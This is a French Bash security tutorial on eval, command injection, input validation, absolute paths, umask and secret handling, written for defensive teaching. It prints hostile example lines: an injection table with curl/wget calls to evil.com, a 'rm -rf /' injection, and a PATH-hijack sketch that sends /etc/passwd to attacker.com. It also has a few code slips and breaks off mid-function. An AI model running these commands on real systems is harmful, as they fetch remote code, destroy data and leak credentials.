

## 📑 Table des matières

```table-of-contents
title: 
style: nestedList # TOC style (nestedList|nestedOrderedList|inlineFirstLevel)
minLevel: 2 # Include headings from the specified level
maxLevel: 2 # Include headings up to the specified level
include: 
exclude: 
includeLinks: true # Make headings clickable
hideWhenEmpty: false # Hide TOC if no headings are found
debugInConsole: false # Print debug info in Obsidian console
```

---

## Introduction

La sécurité en scripting Bash est cruciale car les scripts sont souvent exécutés avec des privilèges élevés et manipulent des données sensibles. Une vulnérabilité peut compromettre tout un système. Cette section couvre les pratiques essentielles pour écrire des scripts sécurisés.

> [!warning] Principe de base **Toujours supposer que les entrées sont malveillantes** jusqu'à preuve du contraire. Un script sécurisé doit être défensif par défaut.

---

## Éviter `eval` quand possible

### 📖 Concept

`eval` exécute une chaîne de caractères comme si c'était du code Bash. C'est extrêmement dangereux car cela permet l'exécution de code arbitraire si l'entrée n'est pas contrôlée.

### 🎯 Pourquoi c'est important

`eval` est l'une des principales sources de vulnérabilités en Bash. Il permet à un attaquant d'injecter et d'exécuter des commandes malveillantes.

### ⚠️ Exemple dangereux

```bash
#!/bin/bash

# DANGEREUX : Ne jamais faire ça !
user_input="$1"
eval "echo $user_input"

# Si l'utilisateur passe : "; rm -rf /"
# La commande exécutée sera : echo ; rm -rf /
```

### ✅ Alternatives sécurisées

```bash
#!/bin/bash

# Alternative 1 : Utilisation directe (quand possible)
user_input="$1"
echo "$user_input"  # Pas d'exécution, juste affichage

# Alternative 2 : Variables indirectes pour accès dynamique
declare -A config
config[host]="localhost"
config[port]="8080"

key="$1"  # L'utilisateur fournit "host" ou "port"
# Au lieu de : eval "echo \$config[$key]"
echo "${config[$key]}"  # Accès sécurisé

# Alternative 3 : Tableaux pour commandes prédéfinies
declare -a allowed_commands=(
    "backup"
    "restore"
    "status"
)

command="$1"
if [[ " ${allowed_commands[@]} " =~ " ${command} " ]]; then
    # Exécuter la commande de manière contrôlée
    case "$command" in
        backup)  do_backup ;;
        restore) do_restore ;;
        status)  show_status ;;
    esac
else
    echo "Commande non autorisée" >&2
    exit 1
fi
```

### 🔍 Cas où `eval` peut être acceptable

```bash
#!/bin/bash

# Cas rare : Construction de commande STRICTEMENT contrôlée
# et SANS entrée utilisateur
function build_safe_command() {
    local action="$1"  # Contrôlé par le script, pas l'utilisateur
    local file="/var/log/app.log"  # Valeur fixe
    
    case "$action" in
        rotate)
            local cmd="mv '$file' '${file}.old'"
            eval "$cmd"  # Acceptable car totalement contrôlé
            ;;
    esac
}
```

> [!tip] Règle d'or Si vous pensez avoir besoin de `eval`, cherchez d'abord une alternative. Dans 99% des cas, il existe une solution plus sûre.

---

## Attention aux injections de commandes

### 📖 Concept

L'injection de commandes se produit quand une entrée utilisateur est incorporée dans une commande shell sans validation, permettant l'exécution de commandes non prévues.

### 🎯 Vecteurs d'injection courants

|Caractère|Effet|Exemple d'injection|
|---|---|---|
|`;`|Séparateur de commandes|`file.txt; rm -rf /`|
|`\|`|Pipe|`data \| mail attacker@evil.com`|
|`&`|Exécution en arrière-plan|`input & malware`|
|`$()`|Substitution de commande|`$(curl evil.com/script.sh)`|
|`` ` ``|Substitution de commande|`` `wget evil.com/malware` ``|
|`>` `>>`|Redirection|`> /etc/passwd`|

### ⚠️ Exemples vulnérables

```bash
#!/bin/bash

# VULNÉRABLE 1 : Commande avec entrée non quotée
filename="$1"
cat $filename  # Si filename="file.txt; rm -rf /"

# VULNÉRABLE 2 : Utilisation dans une sous-commande
user="$1"
result=$(grep $user /etc/passwd)  # Injection possible

# VULNÉRABLE 3 : Dans une condition
path="$1"
if [ -f $path ]; then  # Injection via expansion
    echo "Fichier trouvé"
fi
```

### ✅ Protection contre les injections

```bash
#!/bin/bash

# PROTECTION 1 : Toujours quoter les variables
filename="$1"
cat "$filename"  # Traité comme un seul argument

# PROTECTION 2 : Validation stricte avant utilisation
user="$1"
if [[ "$user" =~ ^[a-zA-Z0-9_-]+$ ]]; then
    result=$(grep "$user" /etc/passwd)
else
    echo "Nom d'utilisateur invalide" >&2
    exit 1
fi

# PROTECTION 3 : Utiliser des tableaux pour les arguments
files=("$@")  # Tous les arguments dans un tableau
for file in "${files[@]}"; do
    cat "$file"  # Chaque élément est traité correctement
done

# PROTECTION 4 : Préférer les outils natifs aux commandes externes
# Au lieu de : echo "$text" | grep "pattern"
if [[ "$text" =~ pattern ]]; then
    echo "Trouvé"
fi
```

### 🛡️ Techniques de validation avancées

```bash
#!/bin/bash

# Fonction de validation réutilisable
validate_filename() {
    local filename="$1"
    
    # Vérifier que le nom ne contient que des caractères sûrs
    if [[ ! "$filename" =~ ^[a-zA-Z0-9._-]+$ ]]; then
        echo "Nom de fichier invalide : caractères interdits" >&2
        return 1
    fi
    
    # Vérifier qu'il n'y a pas de traversée de répertoire
    if [[ "$filename" =~ \.\. ]]; then
        echo "Tentative de traversée de répertoire détectée" >&2
        return 1
    fi
    
    # Vérifier la longueur
    if [[ ${#filename} -gt 255 ]]; then
        echo "Nom de fichier trop long" >&2
        return 1
    fi
    
    return 0
}

# Utilisation
user_file="$1"
if validate_filename "$user_file"; then
    cat "/safe/directory/$user_file"
else
    exit 1
fi
```

> [!warning] Pièges courants
> 
> - Oublier de quoter les variables dans les tests `[ ]`
> - Utiliser `echo` pour transmettre des données à d'autres commandes (utiliser des pipes sécurisés)
> - Faire confiance aux variables d'environnement (elles peuvent être modifiées)

---

## Validation des entrées utilisateur

### 📖 Concept

Toute donnée provenant de l'extérieur du script (arguments, fichiers, réseau) doit être validée avant utilisation. C'est la première ligne de défense.

### 🎯 Principes de validation

1. **Whitelist plutôt que blacklist** : Autoriser uniquement ce qui est attendu
2. **Valider le type et le format** : Nombre, chaîne, format spécifique
3. **Valider la plage** : Min/max, longueur
4. **Valider le contexte** : Fichier existe, permission appropriée

### ✅ Techniques de validation

```bash
#!/bin/bash

# VALIDATION 1 : Nombre d'arguments
if [[ $# -ne 2 ]]; then
    echo "Usage: $0 <username> <age>" >&2
    exit 1
fi

username="$1"
age="$2"

# VALIDATION 2 : Format avec regex
# Username : lettres, chiffres, tirets, underscores uniquement
if [[ ! "$username" =~ ^[a-zA-Z0-9_-]{3,16}$ ]]; then
    echo "Erreur : username invalide (3-16 caractères alphanumériques)" >&2
    exit 1
fi

# VALIDATION 3 : Type numérique
if [[ ! "$age" =~ ^[0-9]+$ ]]; then
    echo "Erreur : l'âge doit être un nombre" >&2
    exit 1
fi

# VALIDATION 4 : Plage de valeurs
if [[ $age -lt 0 || $age -gt 150 ]]; then
    echo "Erreur : âge invalide (0-150)" >&2
    exit 1
fi

# VALIDATION 5 : Chemin de fichier sécurisé
input_file="$3"
# Résoudre le chemin absolu et vérifier qu'il est dans un répertoire autorisé
realpath_file=$(realpath -m "$input_file" 2>/dev/null)
if [[ ! "$realpath_file" =~ ^/home/user/safe/ ]]; then
    echo "Erreur : fichier en dehors du répertoire autorisé" >&2
    exit 1
fi

if [[ ! -f "$realpath_file" ]]; then
    echo "Erreur : fichier inexistant" >&2
    exit 1
fi
```

### 🔍 Validation par type de données

```bash
#!/bin/bash

# EMAIL
validate_email() {
    local email="$1"
    local regex='^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    [[ "$email" =~ $regex ]]
}

# IP ADDRESS (IPv4)
validate_ipv4() {
    local ip="$1"
    local regex='^([0-9]{1,3}\.){3}[0-9]{1,3}$'
    
    if [[ ! "$ip" =~ $regex ]]; then
        return 1
    fi
    
    # Vérifier que chaque octet est <= 255
    IFS='.' read -r -a octets <<< "$ip"
    for octet in "${octets[@]}"; do
        if [[ $octet -gt 255 ]]; then
            return 1
        fi
    done
    return 0
}

# URL
validate_url() {
    local url="$1"
    local regex='^https?://[a-zA-Z0-9.-]+(:[0-9]+)?(/.*)?$'
    [[ "$url" =~ $regex ]]
}

# DATE (YYYY-MM-DD)
validate_date() {
    local date="$1"
    local regex='^[0-9]{4}-[0-9]{2}-[0-9]{2}$'
    
    if [[ ! "$date" =~ $regex ]]; then
        return 1
    fi
    
    # Vérifier que c'est une date valide avec date
    date -d "$date" &>/dev/null
}

# PORT NUMBER
validate_port() {
    local port="$1"
    [[ "$port" =~ ^[0-9]+$ ]] && [[ $port -ge 1 ]] && [[ $port -le 65535 ]]
}

# Exemples d'utilisation
email="user@example.com"
if validate_email "$email"; then
    echo "Email valide"
else
    echo "Email invalide" >&2
    exit 1
fi
```

### 📝 Validation interactive avec boucles

```bash
#!/bin/bash

# Demander et valider jusqu'à obtenir une entrée correcte
read_validated_input() {
    local prompt="$1"
    local validation_func="$2"
    local input
    
    while true; do
        read -p "$prompt" input
        if $validation_func "$input"; then
            echo "$input"
            return 0
        else
            echo "Entrée invalide, réessayez." >&2
        fi
    done
}

# Fonction de validation pour port
validate_port_func() {
    local port="$1"
    [[ "$port" =~ ^[0-9]+$ ]] && [[ $port -ge 1024 ]] && [[ $port -le 65535 ]]
}

# Utilisation
port=$(read_validated_input "Entrez un port (1024-65535) : " validate_port_func)
echo "Port sélectionné : $port"
```

> [!tip] Astuce de validation Créez une bibliothèque de fonctions de validation réutilisables dans un fichier `validation_lib.sh` que vous pouvez sourcer dans vos scripts.

---

## Chemins absolus pour commandes critiques

### 📖 Concept

Utiliser des chemins absolus pour les commandes critiques évite qu'un attaquant ne puisse substituer une commande malveillante via la manipulation du `PATH`.

### 🎯 Pourquoi c'est important

Si votre script exécute `rm` sans chemin absolu et qu'un attaquant modifie le `PATH` pour pointer vers son propre exécutable `rm`, il peut exécuter du code arbitraire avec les privilèges de votre script.

### ⚠️ Vulnérabilité du PATH

```bash
#!/bin/bash

# VULNÉRABLE : Utilise le PATH de l'environnement
rm -rf /tmp/sensitive_data

# Un attaquant pourrait faire :
# export PATH=/tmp/malicious:$PATH
# echo '#!/bin/bash' > /tmp/malicious/rm
# echo 'curl attacker.com/steal?data=$(cat /etc/passwd)' >> /tmp/malicious/rm
# chmod +x /tmp/malicious/rm
# Puis votre script exécute le faux "rm"
```

### ✅ Protection avec chemins absolus

```bash
#!/bin/bash

# SÉCURISÉ : Chemins absolus pour commandes critiques
/bin/rm -rf /tmp/sensitive_data
/usr/bin/find /var/log -type f -name "*.log" -delete
/bin/systemctl restart nginx

# Alternative : Définir un PATH sûr au début du script
PATH=/usr/local/bin:/usr/bin:/bin
export PATH

# Puis utiliser les commandes normalement
rm -rf /tmp/sensitive_data  # Utilisera /bin/rm
```

### 🔍 Trouver les chemins des commandes

```bash
#!/bin/bash

# Méthode 1 : Utiliser 'which'
RM_CMD=$(which rm)
GREP_CMD=$(which grep)

"$RM_CMD" -f /tmp/file
"$GREP_CMD" "pattern" file.txt

# Méthode 2 : Utiliser 'command -v'
if ! command -v docker &>/dev/null; then
    echo "Docker n'est pas installé" >&2
    exit 1
fi

DOCKER_CMD=$(command -v docker)
"$DOCKER_CMD" ps

# Méthode 3 : Définir les chemins en constantes
readonly RM=/bin/rm
readonly GREP=/usr/bin/grep
readonly SYSTEMCTL=/bin/systemctl

"$RM" -rf /tmp/cache
"$SYSTEMCTL" status nginx
```

### 📋 Liste des commandes critiques à protéger

```bash
#!/bin/bash

# Commandes système critiques
readonly RM=/bin/rm
readonly MV=/bin/mv
readonly CP=/bin/cp
readonly CHMOD=/bin/chmod
readonly CHOWN=/bin/chown
readonly MKDIR=/bin/mkdir
readonly RMDIR=/bin/rmdir

# Commandes réseau et transfert
readonly CURL=/usr/bin/curl
readonly WGET=/usr/bin/wget
readonly SCP=/usr/bin/scp
readonly SSH=/usr/bin/ssh

# Commandes de gestion de services
readonly SYSTEMCTL=/bin/systemctl
readonly SERVICE=/usr/sbin/service

# Commandes de gestion de paquets
readonly APT=/usr/bin/apt-get
readonly YUM=/usr/bin/yum
readonly DNF=/usr/bin/dnf

# Commandes d'archives
readonly TAR=/bin/tar
readonly GZIP=/bin/gzip
readonly UNZIP=/usr/bin/unzip

# Utilisation
"$RM" -f /tmp/unsafe_file
"$SYSTEMCTL" restart myservice
```

### 🛡️ Script sécurisé complet

```bash
#!/bin/bash

# Définir un PATH minimal et contrôlé
readonly SAFE_PATH="/usr/local/bin:/usr/bin:/bin"
export PATH="$SAFE_PATH"

# Définir les commandes critiques
readonly RM=/bin/rm
readonly FIND=/usr/bin/find
readonly TAR=/bin/tar

# Vérifier que les commandes existent
for cmd in "$RM" "$FIND" "$TAR"; do
    if [[ ! -x "$cmd" ]]; then
        echo "Erreur : commande manquante $cmd" >&2
        exit 1
    fi
done

# Utiliser les commandes avec chemins absolus
cleanup_logs() {
    "$FIND" /var/log/myapp -type f -name "*.log" -mtime +30 \
        -exec "$RM" -f {} \;
    
    "$TAR" -czf /backup/logs-$(date +%F).tar.gz /var/log/myapp
}

cleanup_logs
```

> [!warning] Attention aux scripts SUID/SGID Si votre script est exécuté avec SUID ou SGID (ce qui est déconseillé pour Bash), l'utilisation de chemins absolus devient CRITIQUE car l'attaquant pourrait obtenir des privilèges élevés.

> [!tip] Bonne pratique Dans les scripts destinés à être exécutés avec des privilèges élevés (root), utilisez TOUJOURS des chemins absolus et vérifiez leur existence avant exécution.

---

## Umask approprié

### 📖 Concept

`umask` définit les permissions par défaut des fichiers et répertoires créés par le script. Un umask trop permissif peut exposer des données sensibles.

### 🎯 Comprendre umask

```bash
# umask utilise une notation octale INVERSÉE
# Les bits à 1 dans umask RETIRENT les permissions

# Permission par défaut d'un fichier : 666 (rw-rw-rw-)
# Permission par défaut d'un répertoire : 777 (rwxrwxrwx)

# Exemples de calcul :
# umask 022 sur fichier : 666 - 022 = 644 (rw-r--r--)
# umask 022 sur dossier : 777 - 022 = 755 (rwxr-xr-x)

# umask 077 sur fichier : 666 - 077 = 600 (rw-------)
# umask 077 sur dossier : 777 - 077 = 700 (rwx------)
```

### 📊 Tableau des umask courants

|umask|Fichiers|Répertoires|Usage|
|---|---|---|---|
|022|644 (rw-r--r--)|755 (rwxr-xr-x)|Défaut système, lecture publique|
|027|640 (rw-r-----)|750 (rwxr-x---)|Groupe peut lire|
|077|600 (rw-------)|700 (rwx------)|Accès propriétaire uniquement|
|007|660 (rw-rw----)|770 (rwxrwx---)|Groupe a tous les droits|

### ✅ Utilisation sécurisée de umask

```bash
#!/bin/bash

# IMPORTANT : Sauvegarder le umask original
original_umask=$(umask)

# Définir un umask restrictif pour le script
# 077 = seul le propriétaire peut lire/écrire
umask 077

# Créer des fichiers sensibles
echo "password=secret123" > /tmp/config.txt
# Le fichier aura les permissions 600 (rw-------)

mkdir /tmp/secure_dir
# Le répertoire aura les permissions 700 (rwx------)

# Exemple avec fichier de log
log_file="/var/log/myapp/sensitive.log"
echo "$(date): Opération effectuée" >> "$log_file"
# Permissions 600 automatiquement appliquées

# Restaurer le umask original à la fin (bonne pratique)
umask "$original_umask"
```

### 🔒 Umask pour différents contextes

```bash
#!/bin/bash

# CONTEXTE 1 : Données très sensibles (mots de passe, clés)
create_sensitive_file() {
    local old_umask=$(umask)
    umask 077  # Propriétaire uniquement
    
    echo "sensitive_data" > /secure/secret.txt
    
    umask "$old_umask"
}

# CONTEXTE 2 : Fichiers de configuration partagés avec un groupe
create_group_config() {
    local old_umask=$(umask)
    umask 027  # Propriétaire rw, groupe r, autres rien
    
    cat > /etc/myapp/config.conf << EOF
host=localhost
port=8080
EOF
    
    umask "$old_umask"
}

# CONTEXTE 3 : Logs accessibles au groupe système
setup_logging() {
    local old_umask=$(umask)
    umask 037  # Propriétaire rw, groupe r, autres rien (plus restrictif)
    
    log_dir="/var/log/myapp"
    mkdir -p "$log_dir"
    touch "$log_dir/app.log"
    
    # Définir le groupe approprié
    chgrp syslog "$log_dir/app.log" 2>/dev/null || true
    
    umask "$old_umask"
}

# CONTEXTE 4 : Fichiers temporaires
create_temp_secure() {
    local old_umask=$(umask)
    umask 077  # Maximum de sécurité pour fichiers temporaires
    
    temp_file=$(mktemp)
    echo "temporary data" > "$temp_file"
    
    # Utiliser le fichier...
    
    # Nettoyer
    rm -f "$temp_file"
    
    umask "$old_umask"
}
```

### 🔍 Vérification des permissions

```bash
#!/bin/bash

# Fonction pour créer un fichier avec umask et vérifier
create_and_check() {
    local umask_value="$1"
    local filename="$2"
    
    local old_umask=$(umask)
    umask "$umask_value"
    
    touch "$filename"
    
    echo "Umask $umask_value appliqué :"
    ls -l "$filename"
    
    umask "$old_umask"
}

# Test
create_and_check 077 /tmp/test_077.txt
create_and_check 022 /tmp/test_022.txt
```

### 🛡️ Script complet avec gestion de umask

```bash
#!/bin/bash
set -euo pipefail

# Sauvegarder le umask d'origine
readonly ORIGINAL_UMASK=$(umask)

# Définir un umask sécurisé par défaut
umask 077

# Fonction de nettoyage qui restaure umask
cleanup() {
    umask "$ORIGINAL_UMASK"
}
trap cleanup EXIT

# Fonction pour créer des fichiers avec permissions spécifiques
create_file_with_perms() {
    local file="$1"
    local desired_perms="$2"  # En octal, ex: 640
    
    # Créer le fichier (umask 077 = permissions 600)
    touch "$file"
    
    # Ajuster aux permissions désirées
    chmod "$desired_perms" "$file"
}

# Utilisation
config_file="/etc/myapp/config.conf"
create_file_with_perms "$config_file" 640

# Écrire la configuration
cat > "$config_file" << EOF
database_password=secret123
api_key=abc123xyz
EOF

echo "Fichier créé avec permissions appropriées"
ls -l "$config_file"
```

> [!warning] Pièges courants
> 
> - Ne pas restaurer le umask original peut affecter d'autres processus
> - Un umask trop restrictif (077) peut causer des problèmes pour les fichiers qui doivent être lus par d'autres processus
> - Oublier que umask affecte TOUS les fichiers créés, pas seulement ceux créés explicitement

> [!tip] Astuce professionnelle Pour les scripts systèmes critiques, documentez clairement le umask utilisé et pourquoi. Par exemple : `umask 077 # Fichiers sensibles : accès propriétaire uniquement`

---

## Pas de mots de passe en clair

### 📖 Concept

Ne jamais stocker ou afficher des mots de passe en texte clair dans un script. Ils peuvent être exposés via l'historique des commandes, les logs, ou la liste des processus.

### 🎯 Dangers des mots de passe en clair

```bash
#!/bin/bash

# ❌ DANGEREUX : Mot de passe en dur dans le script
DB_PASSWORD="SuperSecret123!"
mysql -u admin -p"$DB_PASSWORD" -e "SELECT * FROM users"

# Problèmes :
# 1. Visible dans le code source
# 2. Apparaît dans 'ps aux' pendant l'exécution
# 3. Peut être logué dans l'historique bash
# 4. Stocké dans les backups du script
# 5. Visible dans les logs système
```

### ✅ Solutions sécurisées

#### 1. Variables d'environnement

```bash
#!/bin/bash

# Charger depuis l'environnement
if [[ -z "${DB_PASSWORD:-}" ]]; then
    echo "Erreur : DB_PASSWORD non défini" >&2
    exit 1
fi

# Utiliser sans l'exposer dans les processus
mysql -u admin -p"${DB_PASSWORD}" mydb << EOF
SELECT * FROM users;
EOF
```

#### 2. Fichiers de configuration sécurisés

```bash
#!/bin/bash

# Fichier de config avec permissions 600
CONFIG_FILE="/etc/myapp/credentials.conf"

# Vérifier les permissions avant de lire
check_config_perms() {
    local file="$1"
    
    # Vérifier que le fichier existe
    if [[ ! -f "$file" ]]; then
        echo "Erreur : fichier de config introuvable" >&2
        return 1
    fi
    
    # Vérifier les permissions (doit être 600 ou 400)
    local perms=$(stat -c "%a" "$file")
    if [[ "$perms" != "600" && "$perms" != "400" ]]; then
        echo "Erreur : permissions du fichier trop permissives ($perms)" >&2
        return 1
    fi
    
    # Vérifier le propriétaire (doit être root ou l'utilisateur courant)
    local owner=$(stat -c "%U" "$file")
    if [[ "$owner" != "root" && "$owner" != "$USER" ]]; then
        echo "Erreur : propriétaire du fichier incorrect" >&2
        return 1
    fi
    
    return 0
}

# Charger les credentials de manière sécurisée
load_credentials() {
    local config_file="$1"
    
    if ! check_config_perms "$config_file"; then
        exit 1
    fi
    
    # Sourcer le fichier de config
    # shellcheck disable=SC1090
    source "$config_file"
}

load_credentials "$CONFIG_FILE"

# Utiliser les variables chargées
mysql -u "$DB_USER" -p"$DB_PASSWORD" "$DB_NAME"
```

#### 3. Lecture interactive sécurisée

```bash
#!/bin/bash

# Demander le mot de passe sans l'afficher
read -s -p "Entrez le mot de passe de la base de données : " db_password
echo  # Nouvelle ligne après la saisie

# Vérifier que le mot de passe n'est pas vide
if [[ -z "$db_password" ]]; then
    echo "Erreur : mot de passe vide" >&2
    exit 1
fi

# Utiliser le mot de passe
mysql -u admin -p"$DB_PASSWORD" mydb

# Nettoyer
unset DB_PASSWORD

# Utilisation avec HashiCorp Vault
get_secret_from_vault() {
    local secret_path="$1"
    
    if ! command -v vault &>/dev/null; then
        echo "Erreur : 'vault' n'est pas installé" >&2
        return 1
    fi
    
    # Récupérer le secret depuis Vault
    vault kv get -field=password "$secret_path" 2>/dev/null
}

# Récupérer depuis Vault
DB_PASSWORD=$(get_secret_from_vault "secret/myapp/database")

# Utilisation avec AWS Secrets Manager
get_secret_from_aws() {
    local secret_name="$1"
    
    if ! command -v aws &>/dev/null; then
        echo "Erreur : AWS CLI n'est pas installé" >&2
        return 1
    fi
    
    aws secretsmanager get-secret-value \
        --secret-id "$secret_name" \
        --query SecretString \
        --output text 2>/dev/null
}

# Récupérer depuis AWS
DB_CREDS=$(get_secret_from_aws "myapp/db-credentials")
DB_PASSWORD=$(echo "$DB_CREDS" | jq -r '.password')
```

#### 5. Fichiers de credentials avec .netrc ou .my.cnf

```bash
#!/bin/bash

# Pour MySQL : utiliser .my.cnf
# Créer ~/.my.cnf avec permissions 600
setup_mysql_config() {
    local mysql_config="$HOME/.my.cnf"
    
    # Créer le fichier avec umask restrictif
    (
        umask 077
        cat > "$mysql_config" << 'EOF'
[client]
user=myuser
password=mypassword
host=localhost
EOF
    )
    
    echo "Configuration MySQL créée : $mysql_config"
}

# Utiliser MySQL sans exposer le mot de passe
mysql --defaults-file="$HOME/.my.cnf" mydb -e "SELECT * FROM users"

# Pour cURL : utiliser .netrc
# Créer ~/.netrc avec permissions 600
setup_netrc() {
    local netrc_file="$HOME/.netrc"
    
    (
        umask 077
        cat > "$netrc_file" << 'EOF'
machine api.example.com
login myuser
password mypassword
EOF
    )
    
    echo "Fichier .netrc créé : $netrc_file"
}

# cURL utilisera automatiquement .netrc
curl -n https://api.example.com/data
```

### 🔒 Protection des secrets en mémoire

```bash
#!/bin/bash

# Fonction pour nettoyer les variables sensibles
cleanup_secrets() {
    # Liste des variables à nettoyer
    local sensitive_vars=(
        "DB_PASSWORD"
        "API_KEY"
        "SECRET_TOKEN"
        "AWS_SECRET_ACCESS_KEY"
    )
    
    for var in "${sensitive_vars[@]}"; do
        unset "$var"
    done
}

# Toujours nettoyer à la sortie
trap cleanup_secrets EXIT

# Utilisation sécurisée
DB_PASSWORD=$(get_password_securely)

# Faire le travail...
perform_database_operation

# Les secrets seront automatiquement nettoyés à la sortie
```

### 🚫 Ce qu'il NE FAUT PAS faire

```bash
#!/bin/bash

# ❌ Mot de passe en dur
PASSWORD="secret123"

# ❌ Mot de passe dans l'historique
echo "secret123" | mysql -u root -p

# ❌ Mot de passe visible dans ps
mysql -u root -psecret123

# ❌ Mot de passe dans les logs
echo "Connexion avec password: secret123" >> /var/log/app.log

# ❌ Mot de passe dans un fichier world-readable
echo "PASSWORD=secret123" > /tmp/config.txt

# ❌ Mot de passe dans une variable exportée
export DB_PASSWORD="secret123"  # Visible par tous les processus enfants

# ❌ Mot de passe dans un nom de fichier
backup_file="backup_password_secret123.tar.gz"
```

### ✅ Checklist de sécurité pour les secrets

```bash
#!/bin/bash

# Fonction de validation de la sécurité des secrets
validate_secret_handling() {
    local script_file="$1"
    
    echo "🔍 Vérification de la sécurité des secrets..."
    
    # Vérifier les mots de passe en clair
    if grep -i "password.*=.*['\"]" "$script_file" 2>/dev/null; then
        echo "⚠️  ATTENTION : Mots de passe potentiels en clair détectés"
    fi
    
    # Vérifier les variables exportées sensibles
    if grep -E "export.*(PASSWORD|SECRET|KEY|TOKEN)" "$script_file" 2>/dev/null; then
        echo "⚠️  ATTENTION : Variables sensibles exportées détectées"
    fi
    
    # Vérifier l'utilisation de read sans -s pour les mots de passe
    if grep "read.*password" "$script_file" | grep -v "read -s" 2>/dev/null; then
        echo "⚠️  ATTENTION : Lecture de mot de passe sans option -s (masquage)"
    fi
    
    echo "✅ Vérification terminée"
}

# Utilisation
validate_secret_handling "$0"
```

> [!warning] Dangers spécifiques
> 
> - Les mots de passe dans les arguments sont visibles via `ps aux`
> - L'historique Bash peut être lu par d'autres utilisateurs
> - Les variables exportées sont visibles par tous les processus enfants
> - Les logs peuvent contenir des secrets si mal gérés

> [!tip] Bonnes pratiques professionnelles
> 
> 1. Utilisez toujours des gestionnaires de secrets en production
> 2. Auditez régulièrement vos scripts avec des outils comme `git-secrets`
> 3. Ne commitez JAMAIS de secrets dans Git
> 4. Utilisez `.gitignore` pour les fichiers de configuration sensibles
> 5. Documentez clairement où et comment les secrets doivent être fournis

---

## Variables sensibles non exportées

### 📖 Concept

Les variables exportées sont accessibles par tous les processus enfants. Les variables sensibles ne doivent jamais être exportées pour limiter leur exposition.

### 🎯 Différence entre variables locales et exportées

```bash
#!/bin/bash

# Variable NON exportée (locale au shell)
API_KEY="secret123"

# Variable EXPORTÉE (visible par tous les processus enfants)
export PUBLIC_CONFIG="some_value"

# Démonstration de la visibilité
cat << 'EOF' > /tmp/child_script.sh
#!/bin/bash
echo "API_KEY depuis processus enfant: ${API_KEY:-non visible}"
echo "PUBLIC_CONFIG depuis processus enfant: ${PUBLIC_CONFIG:-non visible}"
EOF

chmod +x /tmp/child_script.sh
/tmp/child_script.sh

# Résultat :
# API_KEY depuis processus enfant: non visible
# PUBLIC_CONFIG depuis processus enfant: some_value
```

### ⚠️ Dangers de l'export

```bash
#!/bin/bash

# ❌ DANGEREUX : Export de variables sensibles
export DB_PASSWORD="secret123"
export API_SECRET="xyz789"
export AWS_SECRET_ACCESS_KEY="abcd1234"

# Tous les processus enfants peuvent maintenant voir ces secrets
/usr/bin/some_external_command
# Ce programme peut lire DB_PASSWORD, API_SECRET, etc.

# Les secrets sont visibles via :
# - printenv
# - /proc/PID/environ
# - Tous les sous-shells et commandes externes
```

### ✅ Gestion sécurisée des variables sensibles

```bash
#!/bin/bash

# Variables sensibles NON exportées
DB_PASSWORD="secret123"
API_KEY="xyz789"
ENCRYPTION_KEY="abc123"

# Variables de configuration non sensibles peuvent être exportées
export APP_NAME="MyApplication"
export LOG_LEVEL="INFO"
export APP_ENV="production"

# Fonction qui utilise les variables sensibles
connect_to_database() {
    # Passer explicitement via stdin ou fichier temporaire
    mysql -u admin <<EOF
SET @password = '$DB_PASSWORD';
-- Utiliser @password dans les requêtes
EOF
}

# Appel d'une commande externe avec variable sensible
call_api_securely() {
    local endpoint="$1"
    
    # Option 1 : Passer via stdin
    curl -H "Authorization: Bearer $API_KEY" "$endpoint"
    
    # Option 2 : Utiliser un fichier temporaire sécurisé
    local temp_config
    temp_config=$(mktemp)
    chmod 600 "$temp_config"
    
    cat > "$temp_config" << EOF
api_key=$API_KEY
EOF
    
    # Passer le fichier à la commande
    some_command --config "$temp_config"
    
    # Nettoyer
    rm -f "$temp_config"
}
```

### 🔍 Vérification des variables exportées

```bash
#!/bin/bash

# Fonction pour vérifier qu'aucune variable sensible n'est exportée
check_exported_secrets() {
    local sensitive_patterns=(
        "PASSWORD"
        "SECRET"
        "KEY"
        "TOKEN"
        "CREDENTIAL"
        "PRIVATE"
    )
    
    echo "🔍 Vérification des variables exportées..."
    
    local found_issues=0
    for pattern in "${sensitive_patterns[@]}"; do
        # Lister les variables exportées contenant le pattern
        if exported_vars=$(export -p | grep -i "$pattern" | grep -v "^declare -x PATH="); then
            echo "⚠️  Variables sensibles exportées détectées :"
            echo "$exported_vars"
            found_issues=1
        fi
    done
    
    if [[ $found_issues -eq 0 ]]; then
        echo "✅ Aucune variable sensible exportée trouvée"
    else
        echo "❌ ATTENTION : Des variables sensibles sont exportées !"
        return 1
    fi
}

# Appeler au début du script
check_exported_secrets || exit 1
```

### 🛡️ Isolation des processus enfants

```bash
#!/bin/bash

# Technique 1 : Nettoyer l'environnement avant d'appeler un processus externe
call_external_command() {
    local command="$1"
    shift
    local args=("$@")
    
    # Créer un environnement minimal
    env -i \
        PATH="/usr/local/bin:/usr/bin:/bin" \
        HOME="$HOME" \
        USER="$USER" \
        "$command" "${args[@]}"
}

# Utilisation
call_external_command /usr/bin/some_untrusted_script

# Technique 2 : Sous-shell isolé avec variables non exportées
run_isolated() {
    (
        # Ce sous-shell n'hérite que des variables exportées
        # Les variables locales du parent ne sont pas visibles
        unset DB_PASSWORD 2>/dev/null  # Au cas où elle serait exportée
        
        /usr/bin/external_command
    )
}

# Technique 3 : Passer uniquement les variables nécessaires
run_with_minimal_env() {
    local command="$1"
    
    # Définir un environnement minimal et contrôlé
    env -i \
        PATH="$PATH" \
        HOME="$HOME" \
        SPECIFIC_VAR="$SPECIFIC_VALUE" \
        "$command"
}
```

### 📋 Bonnes pratiques pour les variables

```bash
#!/bin/bash

# ===== CONFIGURATION SÉCURISÉE =====

# 1. Variables sensibles : JAMAIS exportées, TOUJOURS en minuscules/snake_case
db_password=""
api_secret_key=""
encryption_key=""

# 2. Variables de configuration : Peuvent être exportées, en MAJUSCULES
export APP_NAME="MyApp"
export LOG_LEVEL="DEBUG"
export ENVIRONMENT="production"

# 3. Constantes : readonly pour éviter la modification
readonly CONFIG_DIR="/etc/myapp"
readonly LOG_DIR="/var/log/myapp"

# 4. Variables temporaires : local dans les fonctions
process_data() {
    local temp_data="$1"
    local result
    
    # Traitement...
    result=$(echo "$temp_data" | tr '[:lower:]' '[:upper:]')
    
    echo "$result"
}

# 5. Charger les secrets depuis un fichier sécurisé
load_secrets() {
    local secrets_file="/etc/myapp/secrets.conf"
    
    if [[ ! -f "$secrets_file" ]]; then
        echo "Erreur : fichier de secrets introuvable" >&2
        return 1
    fi
    
    # Vérifier les permissions
